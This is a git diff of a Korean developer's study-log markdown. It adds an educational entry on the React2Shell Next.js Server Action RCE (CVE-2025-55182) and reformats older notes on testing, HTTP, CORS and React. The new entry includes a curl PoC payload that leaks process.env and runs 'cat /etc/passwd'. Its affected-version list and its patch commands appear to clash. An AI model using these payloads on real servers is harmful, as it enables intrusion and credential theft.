@@ -1,3 +1,174 @@
+## 📑 2025.12.31
+
+### # Security - React2Shell (CVE-2025-55182) 취약점
+
+- **Next.js App Router의 Server Action에서 발생한 RCE(원격 코드 실행) 취약점**
+- 인증 없이 원격으로 서버 코드 실행 가능
+- CVSS 점수 9.8 / CRITICAL
+- 2025년 12월 발견 및 패치
+
+#### \* 취약점 개요
+
+**CVE(Common Vulnerabilities and Exposures)**
+
+- 공개적으로 알려진 취약점
+- CVE-발생연도-취약점번호 형식 (예: CVE-2025-55182)
+
+**RCE(Remote Code Execution)**
+
+- 공격자가 원격에서 서버의 운영체제 명령 실행 가능
+- 가장 심각한 보안 취약점 중 하나
+
+<br>
+
+**# 영향받는 버전**<br>
+
+React (Server Components 관련 패키지)<br>
+`react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`
+
+- 19.0.0
+- 19.1.0, 19.1.1
+- 19.2.0
+
+Next.js (App Router 사용 시)<br>
+
+- 15.x 버전대 전체
+- 16.x 버전대 전체
+- 14.3.0-canary.77 및 그 이후의 카나리 버전들 (14.3.0-canary.88 이전)
+
+<br>
+
+#### \* 공격 메커니즘
+
+**1. Server Action 트리거**
+
+    POST /page HTTP/1.1
+    Next-Action: [action-id]
+    Content-Type: multipart/form-data
+
+    [악의적인 FormData]
+
+Next.js는 `Next-Action` 헤더를 감지하면 Server Action 요청으로 인식하고 FormData를 역직렬화
+
+**2. 프로토타입 오염 (Prototype Pollution)**
+
+공격자의 payload:
+
+- `'0': '__proto__'`
+- `'1': '"$@0"'`
+- `'$1:__proto__:then': '$1:constructor:constructor'`
+
+핵심 원리:
+
+- `__proto__`를 통해 JavaScript 객체의 프로토타입 체인 접근
+- `then` 속성을 덮어써서 Promise 처럼 동작하게 조작
+- `Function` 생성자를 참조하여 임의 코드 실행
+
+**3. 공격 흐름**
+
+    1. 안전하지 않은 역직렬화
+        ↓
+    2. 프로토타입 오염 (__proto__ 조작)
+        ↓
+    3. Promise 로직 트리거 (then 메서드 호출)
+        ↓
+    4. Function 생성자 호출
+        ↓
+    5. 원격 코드 실행(RCE)
+
+#### \* 추가 취약점 (2025.12.11 발표)
+
+| CVE            | 심각도         | 설명                                   |
+| -------------- | -------------- | -------------------------------------- |
+| CVE-2025-55182 | 9.8 / CRITICAL | React2Shell RCE 취약점                 |
+| CVE-2025-55183 | 5.3 / MEDIUM   | Server Function 소스 코드 노출         |
+| CVE-2025-55184 | 7.5 / HIGH     | Server Function DoS 취약점 (무한 루프) |
+
+#### \* 대응 방안
+
+**필수: 버전 업데이트**
+
+    # Next.js 15.x
+    npm install next@15.1.3
+
+    # Next.js 14.x
+    npm install next@14.2.23
+
+    # Next.js 13.x
+    npm install next@13.5.9
+
+**코드 레벨 방어 불가**
+
+- 프레임워크 내부에서 자동으로 처리되는 로직의 취약점
+- 개발자가 직접 작성한 코드와 무관하게 노출
+- **반드시 hotfix 필요**
+
+**WAF (Web Application Firewall) 규칙 추가 (임시 방어)**
+
+차단 대상:
+
+- Next-Action 헤더 + 의심스러운 Body (**proto**, constructor)
+- child_process 등 위험한 패턴 포함 요청
+
+**Vercel 사용자**
+
+- CVE 발표 이전에 WAF 규칙 자동 적용됨
+- 지속적인 공격 패턴 대응 중
+
+#### \* PoC (개념 증명) 예시
+
+**공격 시나리오**
+
+서버의 환경 변수 유출:
+
+    curl -X POST http://target.com/page \
+      -H "Next-Action: [id]" \
+      -F '0=__proto__' \
+      -F '1="$@0"' \
+      -F '$1:__proto__:then=$1:constructor:constructor' \
+      -F '_prefix=return process.env'
+
+임의 shell 명령 실행:
+
+    -F '_prefix=require("child_process").execSync("cat /etc/passwd")'
+
+**결과**
+
+- 서버의 환경 변수 노출
+- 임의 파일 읽기/쓰기
+- 시스템 명령 실행
+
+#### \* 보안 교훈
+
+**편리함 vs 보안**
+
+- Server Action의 자동 직렬화/역직렬화는 편리하지만 보안 위험 존재
+- 프레임워크의 '마법' 뒤에 숨겨진 취약점 가능성
+- 블랙박스 로직에 대한 경계 필요
+
+**보안 패치의 중요성**
+
+- 즉시 버전 업데이트
+- 보안 공지 모니터링
+- 의존성 관리 자동화 (Dependabot 등)
+
+#### \* 정리
+
+- **React2Shell**: Next.js Server Action의 RCE 취약점
+- **원인**: 안전하지 않은 역직렬화 + 프로토타입 오염
+- **대응**: 즉시 버전 업데이트 (코드 레벨 방어 불가)
+- **교훈**: 프레임워크의 편의성과 보안 사이의 균형 필요
+
+<br>
+
+#### 🔍 [ [bandal.dev - React2Shell(CVE-2025-55182) 취약점 분석](https://bandal.dev/blog/react-2-shell) ]
+
+#### 🔍 [ [Next.js 공식 보안 업데이트](https://nextjs.org/blog/security-update-2025-12-11) ]
+
+<br>
+
+---
+
 ## 📑 2025.12.29
 
 ### # Frontend - E2E 테스트 (End-to-End Test)
@@ -9,26 +180,29 @@
 #### \* E2E 테스트의 특징
 
 **테스트 범위**
+
 - 버튼 클릭, 페이지 이동, 데이터 입력 등 실제 사용자 동작
 - UI 상호작용, API 호출, 화면 전환 등 통합적으로 검증
 - 전체 시스템이 함께 작동하는 과정 테스트
 
 **주요 도구**
+
 - **Cypress**: 빠른 실행, 강력한 디버깅, 직관적인 API
 - **Playwright**: 멀티 브라우저 지원, 병렬 실행, 안정성 우수
 
 **장점**
+
 - 사용자에게 직접적인 영향을 미치는 오류를 조기에 발견
 - 프로덕트 안정성 향상
 - 배포 후 발생할 수 있는 리스크 감소
 
 #### \* 테스트 종류 비교
 
-| 테스트 종류 | 범위 | 속도 | 목적 |
-|------------|------|------|------|
+| 테스트 종류     | 범위               | 속도 | 목적                               |
+| --------------- | ------------------ | ---- | ---------------------------------- |
 | **유닛 테스트** | 개별 함수/컴포넌트 | 빠름 | 코드 조각이 제대로 작동하는지 확인 |
-| **통합 테스트** | 여러 모듈 통합 | 보통 | 모듈 간 상호작용 검증 |
-| **E2E 테스트** | 전체 애플리케이션 | 느림 | 사용자 경험 전체 검증 |
+| **통합 테스트** | 여러 모듈 통합     | 보통 | 모듈 간 상호작용 검증              |
+| **E2E 테스트**  | 전체 애플리케이션  | 느림 | 사용자 경험 전체 검증              |
 
 #### \* 유닛 테스트 vs E2E 테스트
 
@@ -36,8 +210,8 @@
 
 ```typescript
 // 유닛 테스트: 로그인 함수만 테스트
-test('로그인 성공 시 토큰 반환', () => {
-  const token = login('user@example.com', 'password');
+test("로그인 성공 시 토큰 반환", () => {
+  const token = login("user@example.com", "password");
   expect(token).toBeDefined();
 });
 
@@ -47,20 +221,20 @@ test('로그인 성공 시 토큰 반환', () => {
 // - UI 렌더링
 // - API 통신**E2E 테스트로 해결**
 // E2E 테스트: 전체 플로우 테스트
-test('로그인부터 대시보드까지', async () => {
-  await page.goto('/login');
-  await page.fill('[name="email"]', 'user@example.com');
-  await page.fill('[name="password"]', 'password');
+test("로그인부터 대시보드까지", async () => {
+  await page.goto("/login");
+  await page.fill('[name="email"]', "user@example.com");
+  await page.fill('[name="password"]', "password");
   await page.click('button[type="submit"]');
-  
+
   // 페이지 이동 확인
-  await expect(page).toHaveURL('/dashboard');
-  
+  await expect(page).toHaveURL("/dashboard");
+
   // UI 렌더링 확인
-  await expect(page.locator('h1')).toContainText('대시보드');
-  
+  await expect(page.locator("h1")).toContainText("대시보드");
+
   // 데이터 로드 확인
-  await expect(page.locator('.user-info')).toBeVisible();
+  await expect(page.locator(".user-info")).toBeVisible();
 });
 ```
 
@@ -69,25 +243,25 @@ test('로그인부터 대시보드까지', async () => {
 **Cypress**
 
 ```typescript
-describe('쇼핑몰 주문 플로우', () => {
-  it('상품 검색부터 결제까지', () => {
+describe("쇼핑몰 주문 플로우", () => {
+  it("상품 검색부터 결제까지", () => {
     // 홈페이지 접속
-    cy.visit('/');
-    
+    cy.visit("/");
+
     // 상품 검색
-    cy.get('[data-testid="search-input"]').type('노트북');
+    cy.get('[data-testid="search-input"]').type("노트북");
     cy.get('[data-testid="search-button"]').click();
-    
+
     // 상품 선택
     cy.get('[data-testid="product-item"]').first().click();
-    
+
     // 장바구니 담기
     cy.get('[data-testid="add-to-cart"]').click();
-    cy.get('[data-testid="cart-badge"]').should('contain', '1');
-    
+    cy.get('[data-testid="cart-badge"]').should("contain", "1");
+
     // 결제 진행
     cy.get('[data-testid="checkout"]').click();
-    cy.url().should('include', '/checkout');
+    cy.url().should("include", "/checkout");
   });
 });
 ```
@@ -95,49 +269,56 @@ describe('쇼핑몰 주문 플로우', () => {
 **Playwright**
 
 ```typescript
-test('회원가입 플로우', async ({ page }) => {
-  await page.goto('/signup');
-  
+test("회원가입 플로우", async ({ page }) => {
+  await page.goto("/signup");
+
   // 폼 입력
-  await page.fill('#email', 'newuser@example.com');
-  await page.fill('#password', 'SecurePass123!');
-  await page.fill('#confirm-password', 'SecurePass123!');
-  
+  await page.fill("#email", "newuser@example.com");
+  await page.fill("#password", "SecurePass123!");
+  await page.fill("#confirm-password", "SecurePass123!");
+
   // 약관 동의
-  await page.check('#terms-agree');
-  
+  await page.check("#terms-agree");
+
   // 제출
   await page.click('button[type="submit"]');
-  
+
   // 성공 메시지 확인
-  await expect(page.locator('.success-message')).toBeVisible();
-  await expect(page).toHaveURL('/welcome');
+  await expect(page.locator(".success-message")).toBeVisible();
+  await expect(page).toHaveURL("/welcome");
 });
 ```
+
 #### \* 효과적인 E2E 테스트 전략
 
 **1. 중요한 사용자 플로우 우선**
+
 - 회원가입/로그인
 - 결제 프로세스
 - 핵심 비즈니스 로직
 
 **2. 유닛 테스트와 함께 활용**
+
 - 유닛 테스트: 개별 컴포넌트 신속 검사, 디버깅 시간 단축
 - E2E 테스트: 중요한 사용자 흐름 점검, 치명적 문제 예방
 - 상호 보완적으로 활용하여 안정성 극대화
 
 **3. 데이터 테스트 ID 활용**
+
 <!-- CSS 클래스는 변경될 수 있음 -->
+
 ```markdown
 <button class="btn btn-primary">클릭</button>
 ```
 
 <!-- 테스트 전용 ID 사용 권장 -->
+
 ```markdown
 <button data-testid="submit-button">클릭</button>
 ```
 
 **4. 적절한 대기 처리**
+
 ```typescript
 // 명시적 대기 (권장)
 await page.waitForSelector('[data-testid="result"]');
@@ -173,26 +354,29 @@ await page.waitForTimeout(3000); // 고정 시간 대기
 #### \* HTTP의 주요 특징
 
 **1. 비연결성 (Stateless)**
+
 - 한 번의 요청-응답이 끝나면 연결 종료
 - 서버는 클라이언트의 상태를 저장하지 않음
 - 각 요청은 독립적으로 처리
 
 **2. TCP 연결 사용**
+
 - 통신이 안전하게 연결될 수 있도록 TCP 프로토콜 사용
 - 신뢰성 있는 데이터 전송 보장
 
 **3. 다양한 데이터 포맷 지원**
+
 - HTML, JSON, XML, 이미지 등 전송 가능
 
 #### \* HTTP 메서드
 
-| 메서드 | 설명 | 사용 예시 |
-|--------|------|----------|
-| **GET** | 리소스 조회 | 사용자 목록 가져오기 |
-| **POST** | 리소스 생성 | 새로운 사용자 등록 |
-| **PUT** | 리소스 전체 수정 | 사용자 정보 전체 업데이트 |
-| **PATCH** | 리소스 일부 수정 | 사용자 이름만 수정 |
-| **DELETE** | 리소스 삭제 | 사용자 삭제 |
+| 메서드     | 설명             | 사용 예시                 |
+| ---------- | ---------------- | ------------------------- |
+| **GET**    | 리소스 조회      | 사용자 목록 가져오기      |
+| **POST**   | 리소스 생성      | 새로운 사용자 등록        |
+| **PUT**    | 리소스 전체 수정 | 사용자 정보 전체 업데이트 |
+| **PATCH**  | 리소스 일부 수정 | 사용자 이름만 수정        |
+| **DELETE** | 리소스 삭제      | 사용자 삭제               |
 
 #### \* HTTP 상태 코드
 
@@ -211,6 +395,7 @@ await page.waitForTimeout(3000); // 고정 시간 대기
 #### \* RESTful API
 
 **REST (Representational State Transfer)**
+
 - 웹의 리소스를 클라이언트와 서버가 일관된 방식으로 처리할 수 있도록 하는 설계 원칙
 - HTTP 프로토콜을 기반으로 설계
 
@@ -591,7 +776,6 @@ const module = await import("./heavy-module.js");
 
 ---
 
-
 ## 📑 2025.12.18
 
 ### # React - Error Boundary를 효과적으로 사용하는 방법
@@ -914,31 +1098,31 @@ class MonitoredErrorBoundary extends React.Component {
 - **서로 다른 출처(origin)에서 제공되는 리소스에 접근할 수 있도록 허용하는 정책**
 - 동일 출처 정책(Same-Origin Policy)의 제한을 안전하게 우회하는 메커니즘
 
-#### * 동일 출처 정책 (Same-Origin Policy)
+#### \* 동일 출처 정책 (Same-Origin Policy)
 
 - 브라우저에 보안상의 이유로 기본 적용되는 정책
 - 같은 출처에서 제공되지 않는 리소스는 브라우저가 차단
 - 다른 출처의 서버에 요청 시 응답에 접근 불가
 - 보안을 강화하지만 **합법적인 요청까지 차단될 수 있음**
 
-#### * 출처(Origin)란?
+#### \* 출처(Origin)란?
 
 `https://example.com:443/path?query=1`
+
 - 프로토콜(Protocol): https
 - 도메인(Domain): example.com
 - 포트(Port): 443
 
 위 3가지가 모두 동일해야 **"같은 출처"**
 
-
-#### * CORS가 필요한 이유
+#### \* CORS가 필요한 이유
 
 - SOP로 인해 정상적인 API 통신도 차단됨
 - 프론트엔드(예: localhost:3000)와 백엔드(예: api.example.com)가 다른 도메인일 경우
 - 외부 API를 사용하는 경우
 - 마이크로서비스 아키텍처에서 서비스 간 통신
 
-#### * CORS 적용 방법 (서버 측)
+#### \* CORS 적용 방법 (서버 측)
 
 **1. Access-Control-Allow-Origin 헤더 설정**
 
@@ -946,11 +1130,11 @@ class MonitoredErrorBoundary extends React.Component {
 // Express.js 예시
 app.use((req, res, next) => {
   // 모든 출처 허용 (보안상 권장하지 않음)
-  res.header('Access-Control-Allow-Origin', '*');
-  
+  res.header("Access-Control-Allow-Origin", "*");
+
   // 또는 특정 출처만 허용
-  res.header('Access-Control-Allow-Origin', 'https://example.com');
-  
+  res.header("Access-Control-Allow-Origin", "https://example.com");
+
   next();
 });
 ```
@@ -965,26 +1149,28 @@ res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');**
 res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
 ```
 
-#### * 실무 적용 예시
+#### \* 실무 적용 예시
 
 **서버 측 설정 (Node.js/Express)**
 
 ```javascript
-const cors = require('cors');
+const cors = require("cors");
 
 // 옵션 1: 모든 출처 허용 (개발 환경)
 app.use(cors());
 
 // 옵션 2: 특정 출처만 허용 (프로덕션 환경)
-app.use(cors({
-  origin: ['https://example.com', 'https://www.example.com'],
-  methods: ['GET', 'POST', 'PUT', 'DELETE'],
-  credentials: true, // 쿠키 포함 허용
-  allowedHeaders: ['Content-Type', 'Authorization']
-}));
+app.use(
+  cors({
+    origin: ["https://example.com", "https://www.example.com"],
+    methods: ["GET", "POST", "PUT", "DELETE"],
+    credentials: true, // 쿠키 포함 허용
+    allowedHeaders: ["Content-Type", "Authorization"],
+  })
+);
 ```
 
-#### * CORS와 보안: CSRF 공격
+#### \* CORS와 보안: CSRF 공격
 
 **동일 출처 정책이 막고자 하는 공격**
 
@@ -996,17 +1182,17 @@ app.use(cors({
   4. 의도치 않은 요청이 실행됨 (송금, 정보 변경 등)
 
 **SOP의 역할**
+
 - 악성 사이트에서 다른 출처의 서버로 요청을 보내거나 응답에 접근하는 것을 차단
 - CSRF 공격의 효과를 줄여줌
 
-#### * CORS 요청 흐름
+#### \* CORS 요청 흐름
 
-**1. 단순 요청 (Simple Request)** <br>
-2. Access-Control-Allow-Methods 헤더
+**1. 단순 요청 (Simple Request)** <br> 2. Access-Control-Allow-Methods 헤더
 
 ```javascript
 // 허용할 HTTP 메서드 지정
-res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
 ```
 
 3. Access-Control-Allow-Headers 헤더
@@ -1023,7 +1209,8 @@ Access-Control-Allow-Methods: POST, GET
 Access-Control-Allow-Headers: Content-Type
 ```
 
-#### * 프론트엔드 개발자의 역할
+#### \* 프론트엔드 개발자의 역할
+
 - CORS는 **서버에서 설정**하는 것
 - 프론트엔드 개발자는:
   1. 백엔드 개발자에게 클라이언트 도메인 허용 요청
@@ -1047,11 +1234,11 @@ export default {
 }
 ```
 
-#### * 정리
+#### \* 정리
 
 - **CORS**: 다른 출처 간 리소스 공유를 안전하게 허용하는 메커니즘
 - **SOP**: 보안을 위한 브라우저의 기본 정책
-- **서버 측 설정 필요**: Access-Control-* 헤더로 허용 범위 지정
+- **서버 측 설정 필요**: Access-Control-\* 헤더로 허용 범위 지정
 - **보안**: CSRF 등의 공격을 방어하면서도 필요한 통신은 허용
 
 <br>
@@ -1069,7 +1256,7 @@ export default {
 - React의 `useEffect`는 컴포넌트의 특정 시점에 자동으로 호출되는 훅
 - **마운트**, **업데이트**, **언마운트** 시점에 호출됨
 
-#### * 1. 마운트 시점 (첫 렌더링 후)
+#### \* 1. 마운트 시점 (첫 렌더링 후)
 
 - **컴포넌트가 처음 렌더링되고 나서 호출**
 - 수행 가능한 작업:
@@ -1082,8 +1269,8 @@ export default {
 ```javascript
 useEffect(() => {
   // 컴포넌트 마운트 시 한 번만 실행
-  console.log('컴포넌트가 마운트되었습니다');
-  
+  console.log("컴포넌트가 마운트되었습니다");
+
   // API 호출 예시
   fetchData();
 }, []); // 빈 의존성 배열 = 마운트 시에만 실행#### * 2. 업데이트 시점 (의존성 배열 값 변경)
@@ -1097,10 +1284,10 @@ useEffect(() => {
 ```javascript
 useEffect(() => {
   console.log(`count가 ${count}로 변경되었습니다`);
-  
+
   return () => {
     // cleanup 함수 (다음 effect 실행 전 또는 언마운트 시)
-    console.log('cleanup 실행');
+    console.log("cleanup 실행");
   };
 }, [count]); // count 값이 변경될 때마다 실행#### * 3. 매 렌더링마다 호출 (의존성 배열 생략)
 ```
@@ -1111,11 +1298,11 @@ useEffect(() => {
 ```javascript
 useEffect(() => {
   // 모든 렌더링마다 실행
-  console.log('컴포넌트가 렌더링되었습니다');
+  console.log("컴포넌트가 렌더링되었습니다");
 }); // 의존성 배열 없음
 ```
 
-#### * 4. 언마운트 시점 (컴포넌트 제거)
+#### \* 4. 언마운트 시점 (컴포넌트 제거)
 
 - **컴포넌트가 언마운트될 때 cleanup 함수 호출**
 - cleanup 함수는 `useEffect`의 return 값으로 지정
@@ -1130,25 +1317,25 @@ useEffect(() => {
 useEffect(() => {
   // 이벤트 리스너 등록
   const handleScroll = () => {
-    console.log('스크롤 이벤트');
+    console.log("스크롤 이벤트");
   };
-  
-  window.addEventListener('scroll', handleScroll);
-  
+
+  window.addEventListener("scroll", handleScroll);
+
   return () => {
     // cleanup: 이벤트 리스너 제거
-    window.removeEventListener('scroll', handleScroll);
+    window.removeEventListener("scroll", handleScroll);
   };
 }, []);
 ```
 
-#### * 의존성 배열에 따른 동작
+#### \* 의존성 배열에 따른 동작
 
-| 의존성 배열 | 실행 시점 | 사용 사례 |
-|------------|----------|----------|
-| `[]` (빈 배열) | 마운트 시 1회만 | 초기 데이터 로딩, 구독 설정 |
-| `[value]` | 마운트 + value 변경 시 | 특정 값에 반응하는 동작 |
-| 생략 | 매 렌더링마다 | 특수한 경우에만 사용 (성능 주의) |
+| 의존성 배열    | 실행 시점              | 사용 사례                        |
+| -------------- | ---------------------- | -------------------------------- |
+| `[]` (빈 배열) | 마운트 시 1회만        | 초기 데이터 로딩, 구독 설정      |
+| `[value]`      | 마운트 + value 변경 시 | 특정 값에 반응하는 동작          |
+| 생략           | 매 렌더링마다          | 특수한 경우에만 사용 (성능 주의) |
 
 <br>
 
@@ -1166,7 +1353,7 @@ useEffect(() => {
 - 오류 발생 시 대체 UI를 제공하여 애플리케이션의 신뢰성과 사용자 경험 향상
 - **클래스형 컴포넌트에서만 사용 가능**
 
-#### * Error Boundary의 필요성
+#### \* Error Boundary의 필요성
 
 - React는 기본적으로 비동기 작업의 오류를 자동으로 처리하지 않음
 - 오류 발생 시 문제점:
@@ -1175,7 +1362,7 @@ useEffect(() => {
   - 사용자 경험 크게 저해
   - 대규모 애플리케이션의 신뢰성 문제
 
-#### * Error Boundary의 역할
+#### \* Error Boundary의 역할
 
 - **에러가 발생한 영역에서 대체 UI를 표시**
 - **애플리케이션의 나머지 부분은 정상 동작**
@@ -1183,11 +1370,12 @@ useEffect(() => {
 - 애플리케이션의 안정성 유지
 - 사용자에게 오류 메시지나 대체 화면 제공
 
-#### * 구현 방법
+#### \* 구현 방법
 
 클래스형 컴포넌트의 두 가지 라이프사이클 메서드 사용:
 
 1. **getDerivedStateFromError**
+
    - 오류 발생 시 상태 업데이트
    - 대체 UI를 렌더링하도록 상태 변경
 
@@ -1209,7 +1397,7 @@ class ErrorBoundary extends React.Component {
 
   componentDidCatch(error, errorInfo) {
     // 오류 로깅
-    console.error('Error caught by boundary:', error, errorInfo);
+    console.error("Error caught by boundary:", error, errorInfo);
   }
 
   render() {
@@ -1223,7 +1411,8 @@ class ErrorBoundary extends React.Component {
 }
 ```
 
-#### * 사용 예시
+#### \* 사용 예시
+
 ```javascript
 function App() {
   return (
@@ -1234,20 +1423,22 @@ function App() {
 }
 ```
 
-#### * 선언형 처리의 의미
+#### \* 선언형 처리의 의미
 
 - **"무엇을 해야 하는지"를 정의하는 방식**
 - "어떻게 할지"에 대한 세부 절차를 직접 작성하지 않아도 됨
 - 예: "이 컴포넌트가 오류를 감지하면 특정 대체 UI를 보여준다"
 - 실제 오류 처리 절차는 컴포넌트가 알아서 처리
 
-#### * 유지 보수성 향상 이유
+#### \* 유지 보수성 향상 이유
 
 1. **높은 가독성**
+
    - 선언형 코드가 명령형 코드보다 직관적이고 간결
    - Error Boundary로 감싼 영역의 에러 처리 방식을 한눈에 파악 가능
 
 2. **명확한 관심사 분리**
+
    - 비즈니스 로직과 에러 처리 로직이 명확하게 분리
    - 코드의 복잡성 감소
 
@@ -1255,7 +1446,7 @@ function App() {
    - Error Boundary를 여러 컴포넌트에 재사용 가능
    - 일관된 에러 처리 패턴 유지
 
-#### * 장점 정리
+#### \* 장점 정리
 
 - 애플리케이션 전체 다운 방지
 - 부분적 오류 격리 (오류 발생 영역만 영향)
@@ -1263,9 +1454,10 @@ function App() {
 - 선언형 에러 처리로 코드 가독성 향상
 - 유지 보수성 개선
 
-#### * 주의사항
+#### \* 주의사항
 
 Error Boundary가 **캐치하지 못하는** 에러:
+
 - 이벤트 핸들러 내부의 에러
 - 비동기 코드 (setTimeout, Promise 등)
 - 서버 사이드 렌더링
@@ -1286,7 +1478,7 @@ Error Boundary가 **캐치하지 못하는** 에러:
 - 자바스크립트에서 함수를 정의하는 두 가지 방법
 - **주요 차이점: 호이스팅(Hoisting)**
 
-#### * 함수 선언식 (Function Declaration)
+#### \* 함수 선언식 (Function Declaration)
 
 - 이름이 있는 함수
 - **호이스팅이 발생**
@@ -1299,11 +1491,11 @@ Error Boundary가 **캐치하지 못하는** 에러:
 console.log(add(2, 3)); // 5
 
 function add(a, b) {
-    return a + b;
+  return a + b;
 }
 ```
 
-#### * 함수 표현식 (Function Expression)
+#### \* 함수 표현식 (Function Expression)
 
 - **변수에 익명 함수를 할당**하는 방식
 - 할당된 변수명으로 호출
@@ -1311,42 +1503,42 @@ function add(a, b) {
   - 변수에 할당된 이후에만 호출 가능
   - 코드 흐름상 변수가 선언된 후에만 사용 가능
   - 선언 전 호출 시 에러 발생
- 
+
 ```javascript
 // 선언 전 호출 불가능 (호이스팅 안됨)
 console.log(multiply(2, 3)); // ReferenceError: Cannot access 'multiply' before initialization
 
 const multiply = function (a, b) {
-    return a * b;
+  return a * b;
 };
 
 // 선언 후 호출 가능
 console.log(multiply(2, 3)); // 6#### * 비교 정리
 ```
 
-| 구분 | 함수 선언식 | 함수 표현식 |
-|------|------------|------------|
-| 형태 | `function name() {}` | `const name = function() {}` |
-| 호이스팅 | 발생 (어디서든 호출 가능) | 안됨 (선언 후에만 호출) |
-| 사용 시점 | 코드 어디서든 | 변수 할당 이후만 |
-| 에러 | 선언 전 호출 시 정상 작동 | 선언 전 호출 시 ReferenceError |
+| 구분      | 함수 선언식               | 함수 표현식                    |
+| --------- | ------------------------- | ------------------------------ |
+| 형태      | `function name() {}`      | `const name = function() {}`   |
+| 호이스팅  | 발생 (어디서든 호출 가능) | 안됨 (선언 후에만 호출)        |
+| 사용 시점 | 코드 어디서든             | 변수 할당 이후만               |
+| 에러      | 선언 전 호출 시 정상 작동 | 선언 전 호출 시 ReferenceError |
 
-#### * 실무 활용
+#### \* 실무 활용
 
 ```javascript
 // 함수 선언식 - 호이스팅 활용
 init(); // 정상 작동
 
 function init() {
-  console.log('초기화 완료');
+  console.log("초기화 완료");
 }
 
 // 함수 표현식 - 명확한 코드 흐름
 const config = {
-  apiUrl: 'https://api.example.com'
+  apiUrl: "https://api.example.com",
 };
 
-const fetchData = function() {
+const fetchData = function () {
   return fetch(config.apiUrl);
 };
 
@@ -1365,7 +1557,6 @@ fetchData(); // config 이후에 호출하여 명확한 의존성#### * 정리
 
 ---
 
-
 ## 📑 2025.12.03
 
 ### # JavaScript - Promise
@@ -1374,49 +1565,47 @@ fetchData(); // config 이후에 호출하여 명확한 의존성#### * 정리
 - 비동기 작업의 완료 여부를 약속해주는 개념
 - 콜백 지옥 문제를 해결하고 비동기 처리의 가독성을 높임
 
-#### * 등장 배경
+#### \* 등장 배경
 
 - 자바스크립트는 비동기 처리를 위해 콜백 함수를 많이 사용
 - 코드가 복잡해짐에 따라 콜백이 중첩되는 **"콜백 지옥"** 문제 발생
 - Promise는 비동기 처리의 가독성을 높이고 코드 흐름을 명확하게 관리
 
-#### * Promise의 3가지 상태
+#### \* Promise의 3가지 상태
 
 1. **Pending (대기)**
    - 비동기 작업이 아직 완료되지 않은 초기 상태
-   
 2. **Fulfilled (이행)**
    - 비동기 작업이 성공적으로 완료되어 값을 반환한 상태
-   
 3. **Rejected (거부)**
    - 비동기 작업이 실패하여 오류를 반환한 상태
 
-#### * 상태 전환
+#### \* 상태 전환
 
 - `Pending` → `Fulfilled` 또는 `Rejected`로 전환
 - 한번 상태가 전환되면 다른 상태로 변경되지 않음
 - 결과 값을 통해 작업의 성공 여부 확인 가능
 
-#### * 핵심 메서드
+#### \* 핵심 메서드
 
 - **resolve()**
   - 비동기 작업이 성공했을 때 값을 전달
   - Promise를 `fulfilled` 상태로 전환
-  
 - **reject()**
   - 비동기 작업이 실패했을 때 오류를 전달
   - Promise를 `rejected` 상태로 전환
 
-#### * 장점
+#### \* 장점
 
 - 코드의 가독성 향상
 - 비동기 작업의 흐름 제어에 유용
 - 여러 Promise를 순차적으로 연결 가능 (Promise Chaining)
 - `Promise.all()`, `allSettled()` 등으로 병렬 비동기 작업 처리 가능
 
-#### * 단점
+#### \* 단점
 
 1. **복잡한 에러 처리**
+
    - 단일 체인에서는 간단하지만 여러 Promise가 중첩되면 복잡도 증가
    - `then()` 체인 내 중간 단계에서 발생하는 에러를 세밀하게 다루기 어려움
    - 다양한 에러를 모두 처리하려면 코드가 복잡해질 수 있음
@@ -1426,27 +1615,28 @@ fetchData(); // config 이후에 호출하여 명확한 의존성#### * 정리
    - 순차적 실행 시 `then()` 체인이 길어지면 들여쓰기 구조가 복잡해짐
    - `async/await`을 통해 개선 가능
 
-#### * 예시
+#### \* 예시
+
 ```javascript
 // Promise 생성
 const promise = new Promise((resolve, reject) => {
   // 비동기 작업
   setTimeout(() => {
     const success = true;
-    
+
     if (success) {
-      resolve('작업 성공!'); // fulfilled 상태로 전환
+      resolve("작업 성공!"); // fulfilled 상태로 전환
     } else {
-      reject('작업 실패!'); // rejected 상태로 전환
+      reject("작업 실패!"); // rejected 상태로 전환
     }
   }, 1000);
 });
 
 // Promise 사용
 promise
-  .then(result => console.log(result)) // 성공 시
-  .catch(error => console.error(error)) // 실패 시
-  .finally(() => console.log('작업 완료')); // 항상 실행<br>
+  .then((result) => console.log(result)) // 성공 시
+  .catch((error) => console.error(error)) // 실패 시
+  .finally(() => console.log("작업 완료")); // 항상 실행<br>
 ```
 
 <br>
@@ -1462,7 +1652,9 @@ promise
 ### # React & Kakao map SDK를 활용한 위치기반 서비스 구현 & 최적화 과정 포스팅
 
 #### \* FPS [ 15.3 ➔ 55.7 ] - 약 3.6배 향상( 효율 약 72.5% ) 경험
+
 #### \* 반응 속도 효율 [ 65.53ms ➔ 17.96ms ] - 약 3.6배 향상( 효율 약 72.6% ) 경험
+
 #### \* 생성 프레임 [ 474 ➔ 1671 ] - 약 3.5배 더 많은 프레임 생성( 효율 약 71.6% ) 경험
 
 <br>
